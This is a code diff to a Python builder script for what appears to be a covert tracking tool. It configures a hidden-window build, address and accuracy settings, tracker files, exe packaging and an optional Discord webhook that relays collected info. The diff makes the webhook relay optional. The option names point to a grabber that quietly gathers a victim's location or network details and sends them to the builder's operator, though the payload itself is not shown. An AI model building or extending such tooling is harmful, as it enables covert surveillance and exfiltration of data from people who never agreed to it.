@@ -196,7 +196,7 @@ def remove_tracker():
     current_time = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(time.time()))
     end_time = time.time()
     elapsed_time = end_time - start_time
-    print(BOLD, f"[{current_time}] - Total removed: {total_removed}", RESET)
+    print(BOLD, f"[{current_time}] - Total removed: {total_removed}/12", RESET)
     print(BOLD,f"[{current_time}] - Total time: {elapsed_time}", RESET)
     print(BOLD,f"[{current_time}] - Tracker removal process completed.", RESET)
 
@@ -267,19 +267,22 @@ def build():
     BUILD_ACCURACY = build_inputs('Build with Accuracy?')
     BUILD_EXE = build_inputs('Build into exe? (not onfuscated)')
     BUILD_SYSTEMCHECK = build_inputs('Build with Tracker Files? (not recommended)')
-
-    print(RESET, 'Enter the webhook URL (only Discord supported): ', BOLD, end='')
-    BUILD_WEBHOOK = input()
-    print(RESET)
-    valid = (is_valid_discord_webhook(BUILD_WEBHOOK))
-
-    if not valid:
+    BUILD_WEBHOOK = build_inputs('Relay info to webhook? (only discord)')
+    if BUILD_WEBHOOK == 'y':
+        print(RESET, 'Enter the webhook URL (only Discord supported): ', BOLD, end='')
+        BUILD_WEBHOOK = input()
         print(RESET)
-        print_error("The webhook provided isn't valid")
-        print(RESET, "Press enter to close... ", end='')
-        input()
-        clr()
-        os._exit(0)
+        valid = (is_valid_discord_webhook(BUILD_WEBHOOK))
+
+        if not valid:
+            print(RESET)
+            print_error("The webhook provided isn't valid")
+            print(RESET, "Press enter to close... ", end='')
+            input()
+            clr()
+            os._exit(0)
+    else:
+        BUILD_WEBHOOK = False
 
     clr()
     tag()
@@ -307,14 +310,25 @@ def build():
     BUILD_EXE = BUILD_EXE == 'y'
 
     modified_lines = []
-    build_vars = {
-        'DEBUG': BUILD_DEBUG,
-        'NOWINDOW': BUILD_NOWINDOW,
-        'ADDRESS': BUILD_ADDRESS,
-        'ACCURACY': BUILD_ACCURACY,
-        'WEBHOOK': f"r'{BUILD_WEBHOOK}'",
-        'SYSTEMCHECK': BUILD_SYSTEMCHECK
-    }
+    if BUILD_WEBHOOK != False:
+        build_vars = {
+            'DEBUG': BUILD_DEBUG,
+            'NOWINDOW': BUILD_NOWINDOW,
+            'ADDRESS': BUILD_ADDRESS,
+            'ACCURACY': BUILD_ACCURACY,
+            'WEBHOOK': f"r'{BUILD_WEBHOOK}'",
+            'SYSTEMCHECK': BUILD_SYSTEMCHECK
+        }
+    else:
+        build_vars = {
+            'DEBUG': BUILD_DEBUG,
+            'NOWINDOW': BUILD_NOWINDOW,
+            'ADDRESS': BUILD_ADDRESS,
+            'ACCURACY': BUILD_ACCURACY,
+            'WEBHOOK': "False",
+            'SYSTEMCHECK': BUILD_SYSTEMCHECK
+        }
+
 
     debug(fr'USER_CONFIG: {build_vars}')
     for line in lines:
